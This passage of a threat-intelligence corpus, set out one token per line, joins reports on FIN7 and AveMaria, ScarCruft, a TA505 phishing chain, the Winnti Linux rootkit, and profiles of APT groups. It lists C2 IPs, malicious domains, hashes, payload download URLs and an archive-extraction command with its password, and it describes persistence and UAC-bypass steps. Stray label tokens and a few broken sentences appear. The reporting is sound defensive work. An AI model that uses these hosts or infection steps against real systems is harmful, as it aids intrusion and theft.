became
evident
that
almost
all
of
the
text
used
was
lifted
from
legitimate
security-company
websites
.
 
Phrases
and
sentences
were
borrowed
from
at
least
the
following
companies/sites
:
DKSec
www.dksec.com
,
OKIOK
www.okiok.com/services/tailored-solutions
,
MainNerve
www.mainnerve.com
,
Datics
www.datatics.com/cyber-security
,
Perspective
Risk
www.perspectiverisk.com
,
Synack
https://www.synack.com/company
,
FireEye
https://www.fireeye.com/services/penetration-testing.html
.
 
This
company
seems
to
have
been
used
by
the
FIN7
threat
actor
to
hire
new
people
as
translators
,
developers
and
pentesters
.
 
During
our
research
,
we
found
various
job
advertisements
associated
with
the
company
on
freelance
and
remote-work
websites
.
 
While
tracking
numerous
threat
actors
on
a
daily
basis
during
the
final
days
of
2018
and
at
the
beginning
of
2019
,
we
discovered
various
activity
clusters
sharing
certain
TTPs
associated
with
the
FIN7
intrusion
set
.
 
The
link
between
these
threat
actors
and
FIN7
is
still
weak
,
but
we
decided
to
disclose
a
few
hints
regarding
these
in
this
blog
post
.
 
In
his
history
,
FIN7
has
overlapped
several
times
with
Cobalt
EmpireMonkey
in
terms
of
TTPs
.
 
This
activity
cluster
,
which
Kaspersky
Lab
has
followed
for
a
few
years
,
uses
various
implants
for
targeting
mainly
banks
,
and
developers
of
banking
and
money
processing
software
solutions
.
 
At
the
end
of
2018
,
the
cluster
started
to
use
not
only
CobaltStrike
but
also
Powershell
Empire
in
order
to
gain
a
foothold
on
the
victims
networks
.
 
After
a
successful
penetration
,
it
uses
its
own
backdoors
and
the
CobaltStrike
framework
or
Powershell
Empire
components
to
hop
to
interesting
parts
of
the
network
,
where
it
can
monetize
its
access
.
 
FIN7
s
last
campaigns
were
targeting
banks
in
Europe
and
Central
America
.
 
This
threat
actor
stole
suspected
of
stealing
13
million
from
Bank
of
Valetta
,
Malta
earlier
this
year
.
 
A
few
interesting
overlaps
in
recent
FIN7
campaigns
:
Both
used
macros
to
copy
wscript.exe
to
another
file
,
which
began
with
ms
(
mses.exe
FIN7
,
msutil.exe
EmpireMonkey
)
.
 
Both
executed
a
JScript
file
named
error
in
%TEMP%
(
Errors.txt
in
the
case
of
FIN7
,
Errors.bat
for
EmpireMonkey
)
.
 
Both
used
DocuSign
decoy
documents
with
different
macros
.
 
The
macros
popped
the
same
Document
decryption
error
error
messageeven
if
macro
code
remain
totally
different
.
 
We
have
a
high
level
of
confidence
in
a
historic
association
between
FIN7
and
Cobalt
,
even
though
we
believe
that
these
two
clusters
of
activity
are
operated
by
different
teams
.
 
AveMaria
is
a
new
botnet
,
whose
first
version
we
found
in
September
2018
,
right
after
the
arrests
of
the
FIN7
members
.
 
We
have
medium
confidence
that
this
botnet
falls
under
the
FIN7
umbrella
.
 
In
fact
,
AveMaria
is
a
classic
infostealer
bot
that
collects
all
possible
credentials
from
various
types
of
software
:
browsers
,
email
clients
,
messengers
,
etc.
,
and
can
act
as
a
keylogger
.
 
Since
the
beginning
of
2019
,
we
have
collected
more
than
1300
samples
and
extracted
more
than
130
C2s
.
 
To
deliver
their
malware
,
the
cyber
criminals
use
spearphishing
emails
with
various
types
of
attachments
:
MS
Office
documents
or
spreadsheet
files
exploiting
some
known
vulnerability
like
CVE-2017-11882
,
or
documents
with
Ole2Link
and
SCT
.
 
They
also
use
AutoIT
droppers
,
password-protected
EXE
files
and
even
ISO
images
.
 
What
is
interesting
,
in
some
emails
,
they
ask
targets
to
phone
them
if
they
have
any
questions
,
like
the
FIN7
guys
do
.
 
During
the
investigation
into
FIN7
,
our
threat-hunting
systems
found
an
interesting
overlap
in
between
the
infrastructure
of
FIN7
and
AveMaria
.
 
Basically
,
two
servers
in
the
same
IP
range
and
AS14576
(
autonomous
system
)
share
a
non-standard
SSH
port
,
which
is
222
.
 
One
of
the
servers
is
a
Griffon
C2,
and
the
other
one
,
an
AveMaria
C2
.
 
Distribution
of
targets
is
another
factor
suggesting
that
these
two
malware
families
may
be
connected
.
 
We
analyzed
AveMaria
targets
during
February
and
March
of
2019
.
 
The
spearphishing
emails
were
sent
to
various
kinds
of
businesses
only
and
did
not
target
individuals
.
 
Thirty
percent
of
the
targets
were
small
and
medium-sized
companies
that
were
suppliers
or
service
providers
for
bigger
players
and
21%
were
various
types
of
manufacturing
companies
.
 
We
also
spotted
several
typical
FIN7
targets
,
such
as
retailers
and
hotels
.
 
Most
AveMaria
targets
(
72%
)
were
in
the
EU
.
 
At
the
end
of
2018
,
while
searching
for
new
FIN7
campaigns
via
telemetry
,
we
discovered
a
set
of
activity
that
we
temporarily
called
CopyPaste
from
a
previously
unknown
APT
.
 
Interestingly
,
this
actor
targeted
financial
entities
and
companies
in
one
African
country
,
which
lead
us
to
think
that
CopyPaste
was
associated
with
cybermercenaries
or
a
training
center
.
 
This
set
of
activity
relied
on
open-source
tools
,
such
as
Powershell
Empire
,
and
well-documented
red
teaming
techniques
,
in
order
to
get
a
foothold
within
the
victims
networks
and
avoid
detection
.
 
The
links
between
CopyPaste
and
FIN7
are
still
very
weak
.
 
It
is
possible
that
the
CopyPaste
operators
were
influenced
by
open-source
publications
and
do
not
have
any
ties
with
FIN7
.
 
During
2018
,
Europol
and
DoJ
announced
the
arrest
of
the
leader
of
the
FIN7
and
Carbanak
CobaltGoblin
cybercrime
groups
.
 
It
was
believed
that
the
arrest
of
the
group
leader
will
have
an
impact
on
the
groups
operations
.
 
However
,
recent
data
seems
to
indicate
that
the
attacks
have
continued
without
significant
drawbacks
.
 
One
may
say
CobaltGoblin
and
FIN7
have
even
extended
the
number
of
groups
operating
under
their
umbrella
.
 
We
observe
,
with
various
level
of
confidence
,
that
there
are
several
interconnected
groups
using
very
similar
toolkits
and
the
same
infrastructure
to
conduct
their
cyberattacks
.
 
The
first
of
them
is
the
well-known
FIN7
,
which
specializes
in
attacking
various
companies
to
get
access
to
financial
data
or
PoS
infrastructure
.
 
They
rely
on
a
Griffon
JS
backdoor
and
Cobalt
Meterpreter
,
and
in
recent
attacks
,
Powershell
Empire
.
 
The
second
one
is
CobaltGoblin
Carbanak
EmpireMonkey
,
which
uses
the
same
toolkit
,
techniques
and
similar
infrastructure
but
targets
only
financial
institutions
and
associated
software/services
providers
.
 
We
link
the
AveMaria
botnet
to
these
two
groups
with
medium
confidence
:
AveMaria
s
targets
are
mostly
suppliers
for
big
companies
,
and
the
way
AveMaria
manages
its
infrastructure
is
very
similar
to
FIN7
.
 
The
last
piece
is
the
newly
discovered
CopyPaste
group
,
who
targeted
financial
entities
and
companies
in
one
African
country
,
which
lead
us
to
think
that
CopyPaste
was
associated
with
cybermercenaries
or
a
training
center
.
 
The
links
between
CopyPaste
and
FIN7
are
still
very
weak
.
 
It
is
possible
that
the
operators
of
this
cluster
of
activity
were
influenced
by
open-source
publications
and
do
not
have
any
ties
with
FIN7
.
 
All
of
the
aforementioned
groups
greatly
benefit
from
unpatched
systems
in
corporate
environments
.
 
They
thus
continue
to
use
effective
spearphishing
campaigns
in
conjunction
with
well-known
MS
Office
exploits
generated
by
the
framework
.
 
So
far
,
the
groups
have
not
used
any
zero-days
.
 
FIN7
Cobalt
phishing
documents
may
seem
basic
,
but
when
combined
with
their
extensive
social
engineering
and
focused
targeting
,
they
are
quite
successful
.
 
As
with
their
previous
fake
company
Combi
Security
,
we
are
confident
that
they
continue
to
create
new
personas
for
use
in
either
targeting
or
recruiting
under
a
new
brand
,
IPC
.
 
AveMaria
:
185.61.138.249
tain.warzonedns.com
noreply377.ddns.net
185.162.131.97
91.192.100.62
server.mtcc.me
doddyfire.dyndns.org
212.8.240.116
168.167.45.162
toekie.ddns.net
warmaha.warzonedns.com
.
 
CopyPaste
:
digi-cert.org
somtelnetworks.com
geotrusts.com
secureclientupdate.com
digicertweb.com
sport-pesa.org
itaxkenya.com
businessdailyafrica.net
infotrak-research.com
nairobiwired.com
k-24tv.com
.
 
FIN7
GRIFFON
:
hpservice-cdn.com
realtek-cdn.com
logitech-cdn.com
pci-cdn.com
appleservice-cdn.com
servicebing-cdn.com
.
 
ScarCruft
continues
to
evolve,
introduces
Bluetooth
harvester
.
 
After
publishing
our
initial
series
of
blogposts
back
in
2016
,
we
have
continued
to
track
the
ScarCruft
threat
actor
.
 
ScarCruft
is
a
Korean-speaking
and
allegedly
state-sponsored
threat
actor
that
usually
targets
organizations
and
companies
with
links
to
the
Korean
peninsula
.
 
We
recently
discovered
some
interesting
telemetry
on
this
actor
,
and
decided
to
dig
deeper
into
ScarCruft
s
recent
activity
.
 
This
shows
that
the
actor
is
still
very
active
and
constantly
trying
to
elaborate
its
attack
tools
.
 
Based
on
our
telemetry
,
we
can
reassemble
ScarCruft
s
binary
infection
procedure
.
 
It
used
a
multi-stage
binary
infection
to
update
each
module
effectively
and
evade
detection
.
 
In
addition
,
we
analyzed
the
victims
of
this
campaign
and
spotted
an
interesting
overlap
of
this
campaign
with
another
APT
actor
known
as
DarkHotel
.
 
The
ScarCruft
group
uses
common
malware
delivery
techniques
such
as
spear
phishing
and
Strategic
Web
Compromises
(
SWC
)
.
 
As
in
Operation
Daybreak
,
this
actor
performs
sophisticated
attacks
using
a
zero-day
exploit
.
 
However
,
sometimes
using
public
exploit
code
is
quicker
and
more
effective
for
malware
authors
.
 
We
witnessed
this
actor
extensively
testing
a
known
public
exploit
during
its
preparation
for
the
next
campaign
.
 
In
order
to
deploy
an
implant
for
the
final
payload
,
ScarCruft
uses
a
multi-stage
binary
infection
scheme
.
 
As
a
rule
,
the
initial
dropper
is
created
by
the
infection
procedure
.
 
One
of
the
most
notable
functions
of
the
initial
dropper
is
to
bypass
Windows
UAC
(
User
Account
Control
)
in
order
to
execute
the
next
payload
with
higher
privileges
.
 
This
malware
uses
the
public
privilege
escalation
exploit
code
CVE-2018-8120
or
UACME
which
is
normally
used
by
legitimate
red
teams
.
 
Afterwards
,
the
installer
malware
creates
a
downloader
and
a
configuration
file
from
its
resource
and
executes
it
.
 
The
downloader
malware
uses
the
configuration
file
and
connects
to
the
C2
server
to
fetch
the
next
payload
.
 
In
order
to
evade
network
level
detection
,
the
downloader
uses
steganography
.
 
The
downloaded
payload
is
an
image
file
,
but
it
contains
an
appended
malicious
payload
to
be
decrypted
.
 
The
final
payload
created
by
the
aforementioned
process
is
a
well
known
backdoor
,
also
known
as
ROKRAT
by
Cisco
Talos
.
 
This
cloud
service-based
backdoor
contains
many
features
.
 
One
of
its
main
functions
is
to
steal
information
.
 
Upon
execution
,
this
malware
creates
10
random
directory
paths
and
uses
them
for
a
specially
designated
purpose
.
 
The
malware
creates
11
threads
simultaneously
:
six
threads
are
responsible
for
stealing
information
from
the
infected
host
,
and
five
threads
are
for
forwarding
collected
data
to
four
cloud
services
(
Box
,
Dropbox
,
Pcloud
and
Yandex
)
.
 
When
uploading
stolen
data
to
a
cloud
service
,
it
uses
predefined
directory
path
such
as
/english
,
/video
or
/scriptout
.
 
The
ScarCruft
group
keeps
expanding
its
Exfiltration
targets
to
steal
further
information
from
infected
hosts
and
continues
to
create
tools
for
additional
data
Exfiltration
.
 
We
also
discovered
an
interesting
piece
of
rare
malware
created
by
this
threat
actor
a
Bluetooth
device
harvester
.
 
This
malware
is
responsible
for
stealing
Bluetooth
device
information
.
 
It
is
fetched
by
a
downloader
,
and
collects
information
directly
from
the
infected
host
.
 
This
malware
uses
Windows
Bluetooth
APIs
to
find
information
on
connected
Bluetooth
devices
and
saves
the
following
information
.
 
We
have
found
several
victims
of
this
campaign
,
based
on
our
telemetry
investment
and
trading
companies
in
Vietnam
and
Russia
.
 
We
believe
they
may
have
some
links
to
North
Korea
,
which
may
explain
why
ScarCruft
decided
to
closely
monitor
them
.
 
ScarCruft
also
attacked
a
diplomatic
agency
in
Hong
Kong
,
and
another
diplomatic
agency
in
North
Korea
.
 
It
appears
ScarCruft
is
primarily
targeting
intelligence
for
political
and
diplomatic
purposes
.
 
We
discovered
one
victim
from
Russia
that
also
triggered
a
malware
detection
while
staying
in
North
Korea
in
the
past
.
 
The
fact
that
this
victim
visits
North
Korea
makes
its
special
and
suggests
that
it
may
have
valuable
information
about
North
Korean
affairs
.
 
ScarCruft
infected
this
victim
on
September
21,
2018
.
 
But
before
the
ScarCruft
infection
,
however
,
another
APT
group
also
targeted
this
victim
with
the
host
being
infected
with
GreezeBackdoor
on
March
26,
2018
.
 
GreezeBackdoor
is
a
tool
of
the
DarkHotel
APT
group
,
which
we
have
previously
written
about
.
 
In
addition
,
this
victim
was
also
attacked
by
the
Konni
malware
on
03
April
2018
.
 
The
Konni
malware
was
disguised
as
a
North
Korean
news
item
in
a
weaponized
documents
(
the
name
of
the
document
was
Why
North
Korea
slams
South
Korea
s
recent
defense
talks
with
U.S-Japan.zip
)
This
is
not
the
first
time
we
have
seen
an
overlap
of
ScarCruft
and
DarkHotel
actors
.
 
Members
from
our
team
have
already
presented
on
the
conflict
of
these
two
threat
actors
at
security
conferences
.
 
We
have
also
shared
more
details
with
our
threat
intelligence
customers
in
the
past
.
 
They
are
both
Korean-speaking
threat
actors
and
sometimes
their
victimology
overlaps
.
 
But
both
group
seem
to
have
different
TTPs
(
Tactics
,
Techniques
and
Procedures
)
and
it
leads
us
to
believe
that
one
group
regularly
lurks
in
the
other
s
shadow
.
 
The
ScarCruft
has
shown
itself
to
be
a
highly-skilled
and
active
group
.
 
It
has
a
keen
interest
in
North
Korean
affairs
,
attacking
those
in
the
business
sector
who
may
have
any
connection
to
North
Korea
,
as
well
as
diplomatic
agencies
around
the
globe
.
 
ScarCruft
tools
:
02681a7fe708f39beb7b3cf1bd557ee9
Bluetooth
info
harvester
.
 
ScarCruft
tools
:
C781f5fad9b47232b3606e4d374900cd
Installer
.
 
ScarCruft
tools
:
032ed0cd234f73865d55103bf4ceaa22
Downloader
.
 
ScarCruft
tools
:
22aaf617a86e026424edb7c868742495
AV
Remover
.
 
ScarCruft
tools
:
07d2200f5c2d03845adb5b20841faa94
AV
Remover
.
 
GreezaBackdoor
of
DarkHotel
:
5e0e11bca0e94914e565c1dcc1ee6860
.
 
TA505
is
Expanding
its
Operations
In
the
last
few
days
,
during
monitoring
activities
,
Yoroi
CERT
noticed
a
suspicious
attack
against
an
Italian
organization
.
 
The
malicious
email
contains
a
highly
suspicious
sample
which
triggered
the
ZLAB
team
to
investigate
its
capabilities
and
its
possible
attribution
,
discovering
a
potential
expansion
of
the
TA505
operation
.
 
The
threat
group
is
also
known
for
its
recent
attack
campaign
against
Bank
and
Retail
business
sectors
,
but
the
latest
evidence
indicates
a
potential
expansion
of
its
criminal
operation
to
other
industries
too
.
 
Dropper
:
0c88e285b6fc183c96b6f03ca5700cc9ca7c83dfccc6ad14a946d1868d1cc273
Excel
file
with
malicious
macro
.
 
The
intercepted
attack
starts
with
a
spear
phishing
email
embedding
a
spreadsheet
.
 
The
document
is
weaponized
with
malicious
macro
code
triggered
when
the
user
opens
the
document
to
see
the
content
under
the
obfuscated
view
.
 
To
understand
its
capabilities
,
the
macro
code
has
been
isolated
and
analyzed
in
detail
.
 
Surprisingly
,
the
source
code
is
composed
by
more
than
1600
lines
of
code
and
it
is
highly
obfuscated
.
 
Paying
more
attention
during
the
code
analysis
,
we
discovered
that
it
is
full
of
junk
instructions
used
to
declare
and
initialize
variables
never
used
.
 
Only
a
small
portion
of
this
code
is
actually
used
to
start
the
infection
,
the
rest
is
just
junk
code
.
 
Once
the
macro
is
executed
,
the
malware
downloads
two
files
from
kentona[.su
,
using
an
SSL
encrypted
communication
,
and
stores
them
in
C:\Users\Public
path
:
rtegre.exe
and
wprgxyeqd79.exe
.
 
Generic
:
aafa83d5e0619e69e64fcac4626cfb298baac54c7251f479721df1c2eb16bee7
Trojan
Downloader
(
Executable
file
)
.
 
Trojan
:
6f1a8ee627ec2ed7e1d818d32a34a163416938eb13a97783a71f9b79843a80a2
SFX
(
self-extracting
archive
)
(
Executable
file
)
.
 
The
wprgxyeqd79.exe
sample
actually
is
a
Self
Extracting
Archive
(
SFX
)
containing
four
files
designed
to
be
extracted
in
the
%TEMP%
folder
.
 
After
that
,
it
executes
exit.exe
which
launches
the
i.cmd
batch
script
.
 
This
new
script
performs
a
ping
to
www[.cloudflare[.com
for
three
times
with
a
delay
of
3000ms
,
testing
the
connectivity
of
the
victim
machine
.
 
If
the
host
is
successfully
reached
,
the
script
renames
a
file
named
kernel.dll
,
obviously
not
the
real
one
,
in
uninstall.exe
,
another
misleading
name
.
 
Then
it
invokes
the
renamed
executable
and
runs
it
passing
a
series
of
parameter
:
uninstall.exe
x
-pQELRatcwbU2EJ5
-y
These
parameters
are
needed
to
self-decrypt
the
uninstall.exe
file
which
is
again
another
SFX
archive
.
 
The
-p
parameter
,
indeed
,
specify
the
password
of
the
archive
to
be
extracted
.
 
The
crucial
file
,
at
this
point
of
the
infection
,
is
the
SFX
executable
named
uninstall.exe
.
 
It
has
a
structure
similar
to
previous
wprgxyeqd79.exe
file
:
two
of
their
files
have
the
same
name
,
but
the
content
of
this
new
SFX
is
extracted
in
the
%ALLUSERSPROFILE%\Windows
Anytime
Upgrade
directory
.
 
Another
time
,
the
execution
flow
moves
from
exit.exe
to
i.cmd
.
 
The
script
is
quite
different
from
the
previous
one
:
it
guarantees
its
persistence
on
the
victim
machine
through
the
setting
of
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
registry
key
,
creating
a
new
entry
named
Windows
Anytime
Upgrade
which
points
to
winserv.exe
,
just
stored
into
the
same
folder
.
 
Thus
,
the
script
provides
to
run
winserv.exe
.
 
An
interesting
part
of
the
script
is
the
continuous
killing
of
every
rundll32.exe
process
running
into
the
victim
machine
,
generates
a
huge
amount
of
noise
,
as
visible
in
the
following
process
explorer
view
.
 
Anyway
,
just
before
the
kill
loop
,
the
real
malicious
payload
is
executed
:
the
winserv.exe
file
.
 
Analyzing
it
in
depth
,
we
discover
it
actually
is
the
RMS
(
Remote
Manipulator
System
)
client
by
TektonIT
,
encrypted
using
the
MPress
PE
compressor
utility
,
a
legitimate
tool
,
to
avoid
antivirus
detection
.
 
TektonIT
RMS
acts
as
a
remote
administration
tool
,
allowing
the
attacker
to
gain
complete
access
to
the
victim
machine
.
 
Together
with
the
RMS
executable
,
there
is
another
file
named
settings.dat
containing
the
custom
configuration
prepared
by
the
attacker
.
 
It
contains
information
like
:
Server
address
and
port
the
client
will
connect
to
;
The
password
chosen
by
the
attacker
for
the
remote
access
;
The
ID
associated
to
the
victim
client
.
 
All
these
information
are
automatically
loaded
by
the
RMS
executable
and
firstly
stored
in
the
registry
key
HKCU\Software\tektonik\Remote
MANIPULATOR
System\Host\parameters
.
 
At
the
next
startup
,
the
software
will
directly
load
the
configuration
from
the
just
created
key
.
 
The
client
establishes
a
new
connection
with
the
remote
command
and
control
server
hosted
on
a
Bulgarian
remote
host
217.12.201.159
,
part
of
a
Virtual
Dedicated
Server
subnet
of
the
AS-21100,
operated
by
ITL
LLC
.
 
After
the
reconstruction
of
the
full
infection
chain
,
we
noticed
strong
similarities
with
a
recent
spear-phishing
attack
campaign
against
an
unspecified
US
retail
company
.
 
The
attack
,
as
stated
by
CyberInt
,
leveraged
a
command
and
control
server
located
in
Germany
related
to
the
TA505
actor
:
a
very
active
group
involved
in
cyber-criminal
operation
all
around
the
world
,
threatening
a
wide
range
of
high
profile
companies
,
active
since
2014
.
 
The
comparison
of
the
infection
chains
reveals
in
both
cases
the
attacker
used
a
couple
of
SFX
stages
to
deploy
the
RMS
software
:
a
legitimate
remote
administration
tool
produced
by
the
Russian
company
TektonIT
.
 
The
tool
is
able
to
grant
remote
access
and
full
,
direct
control
of
the
infected
machine
to
the
group
.
 
Also
,
some
code
pieces
are
directly
re-used
in
the
analyzed
campaigns
,
such
as
the
i.cmd
and
exit.exe
files
,
and
,
at
the
same
time
,
some
new
components
have
been
introduced
,
for
instance
the
rtegre.exe
and
the
veter1605_MAPS_10cr0.exe
file
.
 
During
the
analysis
,
we
also
noticed
the
veter1605_MAPS_10cr0.exe
file
slightly
changed
run
after
run
,
a
few
hours
after
the
initial
discovery
the
infection
chain
dropped
it
with
different
icons
,
different
suffix
,
from
cr0
to
cr24
,
and
appendix
from
veter1605_
to
veter2005_
.
 
This
may
indicate
the
campaign
is
still
ongoing
.
 
The
TA505
group
is
one
of
the
most
active
threat
groups
operating
since
2014
,
it
has
traditionally
targeted
Banking
and
Retail
industries
,
as
we
recently
documented
during
the
analysis
of
the
Stealthy
Email
Stealer
part
of
their
arsenal
.
 
The
peculiarity
of
this
recent
attack
wave
is
it
actually
hit
a
company
not
strictly
in
the
Banking
or
Retail
sector
,
as
they
recently
did
,
suggesting
the
threat
group
could
be
potentially
widening
their
current
operations
.
 
Dropurl
:
kentona[.su
47.245.58.124
https://kentona[.su/xpepriubgpokejifuv7efrhguskdgfjn/ananas.exe
https://kentona[.su/xpepriubgpokejifuv7efrhguskdgfjn/pasmmm.exe
C2:
217[.12.201.159
TA505
:
0c88e285b6fc183c96b6f03ca5700cc9ca7c83dfccc6ad14a946d1868d1cc27325
TA505
:
1ee1ba514212f11a69d002005dfc623b1871cc808f18ddfa2191102bbb9f623b
TA505
:
fd701894e7ec8d8319bc9b32bba5892b11bdf608c3d04c2f18eff83419eb6df0
TA505
:
c69ce39ac3e178a89076136af7418c6cb664844b0ce5cb643912ed56c373a08a
TA505
:
5310c2397ba4c783f7ee9724711a6da9b5c603b5c9781fff3407b46725e338b3
.
 
Winnti
:
More
than
just
Windows
and
Gates
.
 
The
Winnti
malware
family
was
first
reported
in
2013
by
Kaspersky
Lab
.
 
Since
then
,
threat
actors
leveraging
Winnti
malware
have
victimized
a
diverse
set
of
targets
forvaried
motivations
.
 
While
the
name
Winnti
in
public
reporting
was
previously
used
tosignify
a
single
actor
,
pronounced
divergence
in
targeting
and
tradecraft
betweencampaigns
has
led
industry
consensus
to
break
up
the
tracking
of
the
continued
use
ofthe
Winnti
malware
under
different
actor
clusters
.
 
The
underlying
hypothesis
is
that
themalware
itself
may
be
shared
(
or
sold
)
across
a
small
group
of
actors
.
 
In
April
2019
,
reports
emerged
of
an
intrusion
involving
Winnti
malware
at
a
GermanPharmaceutical
company
.
 
Following
these
reports
,
Chronicle
researchers
doubled
downon
efforts
to
try
to
unravel
the
various
campaigns
where
Winnti
was
leveraged
.
 
Analysisof
these
larger
convoluted
clusters
is
ongoing
.
 
While
reviewing
a
2015
report
of
a
Winnti
intrusion
at
a
Vietnamese
gaming
company
,
we
identified
a
small
cluster
of
Winnti
samples
designed
specifically
for
Linux
.
 
The
following
is
a
technical
analysis
of
thisvariant
.
 
The
Linux
version
of
Winnti
is
comprised
of
two
files
:
a
main
backdoor
(
libxselinux
)
and
a
library
(
libxselinux.so
)
used
to
hide
it
s
activity
on
an
infected
system
.
 
libxselinux.so
the
userland
rootkit
.
 
libxselinux.so.old
:
11a9f798227be8a53b06d7e8943f8d68
906dc86cb466c1a22cf847dda27a434d04adf065
4741c2884d1ca3a40dadd3f3f61cb95a59b11f99a0f980dbadc663b85eb77a2a
IP
.
 
Ids.me
.
 
The
library
used
to
hide
Winnti
s
system
activity
is
a
copy
of
the
open-source
userland
rootkit
Azazel
,
with
minor
changes
.
 
When
executed
,
it
will
register
symbols
for
multiple
commonly
used
functions
,
including
:
open()
,
rmdir()
,
and
unlink()
,
and
modify
their
returns
to
hide
the
malware
s
operations
.
 
Distinct
changes
to
Azazel
by
the
Winnti
developers
include
the
addition
of
a
function
named
Decrypt2
,
which
is
used
to
decode
an
embedded
configuration
similar
to
the
core
implant
.
 
Unlike
standard
Azazel
which
is
configured
to
hide
network
activity
based
on
port
ranges
,
the
Winnti
modified
version
keeps
a
list
of
process
identifiers
and
network
connections
associated
with
the
malware
s
activity
.
 
This
modification
likely
serves
to
simplify
the
operator
s
sample
configuration
process
by
not
having
to
denote
specific
ports
to
hide
.
 
Strings
within
this
sample
associated
with
the
malware
s
operations
are
encoded
using
a
single-byte
XOR
encoding
.
 
The
following
is
an
example
Python
function
to
decode
these
strings
.
 
libxselinux.old
:
7f4764c6e6dabd262341fd23a9b105a3
dc96d0f02151e702ef764bbc234d1e73d2811416
ae9d6848f33644795a0cc3928a76ea194b99da3c10f802db22034d9f695a0c23
IP
.
 
Ids.me
.
 
Winnti
Linux
variant
s
core
functionality
is
within
libxselinux
.
 
Upon
execution
,
an
embedded
configuration
is
decoded
from
the
data
section
using
a
simple
XOR
cipher
.
 
The
decoded
configuration
is
similar
in
structure
to
the
version
Kaspersky
classifies
as
Winnti
2.0,
as
well
as
samples
in
the
2015
Novetta
report
.
 
Embedded
in
this
sample
s
configuration
three
command-and-control
server
addresses
and
two
additional
strings
we
believe
to
be
campaign
designators
.
 
Winnti
ver.1
,
these
values
were
designated
as
tag
and
group
.
 
For
context
,
embedded
Winnti
campaign
designators
have
ranged
from
target
names
,
geographic
areas
,
industry
,
and
profanity
.
 
Winnti
malware
handles
outbound
communications
using
multiple
protocols
including
:
ICMP
,
HTTP
,
as
well
as
custom
TCP
and
UDP
protocols
.
 
Use
of
these
protocols
is
thoroughly
documented
in
the
Novetta
and
Kaspersky
reports
.
 
While
the
outbound
communication
mechanisms
are
well
documented
,
less
attention
has
been
paid
to
a
feature
of
recent
versions
of
Winnti
we
came
across
in
the
Linux
variant
(
as
well
as
Windows
)
that
allows
the
operators
to
initiate
a
connection
directly
to
an
infected
host
,
without
requiring
a
connection
to
a
control
server
.
 
This
secondary
communication
channel
may
be
used
by
operators
when
access
to
the
hard-coded
control
servers
is
disrupted
.
 
Additionally
,
the
operators
could
leverage
this
feature
when
infecting
internet-facing
devices
in
a
targeted
organization
to
allow
them
to
reenter
a
network
if
evicted
from
internal
hosts
.
 
This
passive
implant
approach
to
network
persistence
has
been
previously
observed
with
threat
actors
like
Project
Sauron
and
the
Lamberts
.
 
Initial
technical
information
about
this
feature
was
shared
by
the
Thyssenkrupp
CERT
in
the
form
of
an
Nmap
script
that
could
be
used
to
identify
Winnti
infections
through
network
scanning
.
 
This
script
identifies
infected
hosts
by
first
sending
a
custom
hello
packet
,
immediately
followed
by
an
encoded
request
for
host
information
,
and
then
parsing
the
response
.
 
The
initial
request
,
referred
to
as
the
helo/hello
request
in
the
Nmap
script
,
is
comprised
of
four
DWORDs
.
 
The
first
three
are
generated
by
rand()
and
the
fourth
is
computed
based
on
the
first
and
third
.
 
When
received
by
a
Winnti
infected
host
,
it
will
validate
the
received
packet
and
listen
for
a
second
inbound
request
containing
tasking
.
 
This
second
request
(
Encoded
Get
System
Information
Request
)
is
encoded
using
the
same
method
as
the
custom
TCP
protocol
used
for
communication
with
command-and-control
servers
,
which
uses
a
four-byte
XOR
encoding
.
 
Before
acting
on
the
request
,
Winnti
will
validate
the
third
DWORD
contains
the
magic
value
0xABC18CBA
before
executing
tasking
.
 
Clusters
of
Winnti
related
activity
have
become
a
complex
topic
in
threat
intelligence
circles
,
with
activity
vaguely
attributed
to
different
codenamed
threat
actors
.
 
The
threat
actors
utilizing
this
toolset
have
repeatedly
demonstrated
their
expertise
in
compromising
Windows
based
environments
.
 
An
expansion
into
Linux
tooling
indicates
iteration
outside
of
their
traditional
comfort
zone
.
 
This
may
indicate
the
OS
requirements
of
their
intended
targets
but
it
may
also
be
an
attempt
to
take
advantage
of
a
security
telemitry
blindspot
in
many
enterprises
,
as
is
with
Penquin
Turla
and
APT28
s
Linux
XAgent
variant
.
 
Utilizing
a
passive
listener
as
a
communications
channel
is
characteristic
of
the
Winnti
developers
foresight
in
needing
a
failsafe
secondary
command-and-control
mechanisms
.
 
BlackOasis
is
a
Middle
Eastern
threat
group
that
is
believed
to
be
a
customer
of
Gamma
Group
.
 
The
group
has
shown
interest
in
prominent
figures
in
the
United
Nations
,
as
well
as
opposition
bloggers
,
activists
,
regional
news
correspondents
,
and
think
tanks
.
 
A
group
known
by
Microsoft
as
O
NEODYMIUM
is
Oreportedly
associated
closely
with
O
BlackOasis
operations
,
but
evidence
that
the
group
names
are
aliases
has
not
been
identified
.
 
BRONZE
BUTLER
:
REDBALDKNIGHT
,
Tick
.
 
BRONZE
BUTLER
is
a
cyber
espionage
group
with
likely
Chinese
origins
that
has
been
active
since
at
least
2008
.
 
The
group
primarily
targets
Japanese
organizations
,
particularly
those
in
government
,
biotechnology
,
electronics
manufacturing
,
and
industrial
chemistry
.
 
Carbanak
:
Anunak
,
Carbon
Spider
.
 
Carbanak
is
a
threat
group
that
mainly
targets
banks
.
 
It
also
refers
to
malware
of
the
same
name
(
Carbanak
)
.
 
It
is
sometimes
referred
to
as
O
FIN7
,
but
these
appear
to
be
two
groups
using
the
same
O
Carbanak
malware
and
are
therefore
tracked
separately
.
 
Gamaredon
Group
is
a
threat
group
that
has
been
active
since
at
least
2013
and
has
targeted
individuals
likely
involved
in
the
Ukrainian
government
.
 
GCMAN
is
a
threat
group
that
focuses
on
targeting
banks
for
the
purpose
of
transferring
money
to
e-currency
sevises
.
 
Gorgon
Group
is
a
threat
group
consisting
of
members
who
are
suspected
to
be
Pakistan
based
or
have
other
connections
to
Pakistan
.
 
The
group
has
performed
a
mix
of
criminal
and
targeted
attacks
,
including
campaigns
against
government
organizations
in
the
United
Kingdom
,
Spain
,
Russia
,
and
the
United
States
.
 
Sandworm
Team
:
Quedagh
,
VOODOO
BEAR
.
 
Sandworm
Team
is
a
Russian
cyber
espionage
group
that
has
operated
since
approximately
2009
.
 
The
group
likely
consists
of
Russian
pro-hacktivists
.
 
Sandworm
Team
targets
mainly
Ukrainian
entities
associated
with
energy
,
industrial
control
systems
,
SCADA
,
government
,
and
media
.
 
Sandworm
Team
has
been
linked
to
the
Ukrainian
energy
sector
attack
in
late
2015
.
 
Scarlet
Mimic
is
a
threat
group
that
has
targeted
minority
rights
activists
.
 
This
group
has
not
been
directly
linked
to
a
government
source
,
but
the
group
's
motivations
appear
to
overlap
with
those
of
the
Chinese
government
.
 
